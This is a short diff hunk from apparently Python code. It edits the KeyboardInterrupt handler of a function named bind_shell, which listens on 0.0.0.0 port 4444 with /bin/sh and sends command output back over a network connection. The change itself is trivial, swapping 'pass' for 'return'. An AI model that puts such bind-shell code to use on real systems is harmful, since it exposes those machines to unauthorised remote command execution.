@@ -61,7 +61,7 @@ def bind_shell(host: str = "0.0.0.0", port: int = 4444, shell: str = "/bin/sh") 
             if output:
                 conn.send(output)
     except KeyboardInterrupt:
-        pass
+        return
     finally:
         conn.close()
         server.close()
